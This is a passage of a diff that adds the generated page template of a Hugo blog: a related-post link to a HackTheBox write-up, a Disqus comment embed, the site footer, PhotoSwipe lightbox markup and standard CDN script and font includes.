+    <a href="/p/hackthebox-onlyforyou/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-onlyforyou/OnlyForYou.23aaa710c708eb7341f08b78acb7d1aa_hu13502282750288352538.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - OnlyForYou"
+                        
+                        data-hash="md5-I6qnEMcI63NB8It4rLfRqg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - OnlyForYou</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
